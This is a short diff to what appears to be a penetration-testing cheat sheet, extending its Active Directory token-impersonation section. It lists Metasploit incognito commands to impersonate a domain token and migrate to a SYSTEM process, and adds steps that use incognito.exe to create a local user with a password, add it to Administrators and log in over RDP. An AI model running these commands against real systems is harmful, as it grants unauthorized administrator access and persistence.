@@ -75,13 +75,24 @@ sudo apt-get install libx11-dev:i386 libx11-dev
 
 # Active Directory
 ## Token Impersonation:
+### Metasploit:
 ```bash
-# In Metasploit Meterpreter:
 use incognito
 list_tokens -g
 impersonate_token DOMAIN\\USER
 # Since the token might give you admin, you won't be able to drop into a shell directly, for that, we need to migrate to SYSTEM Process.
 migrate <PROCESS ID>
+```
+### No Metasploit:
+```
+# Download the binaries from here
+https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip
+# Store the binaries on the server:
+# Using incognito, we can add a new user:
+./incognito.exe add_user theflash2k @_5trong_Pa5sw0rd!
+# Now adding the user to the adminstrators group:
+./incognito.exe add_localgroup_user Administrators theflash2k
+# Now, we can simply use RDP, and we can enjoy an admin account
 ```
 
 ## Stabalizing shell:
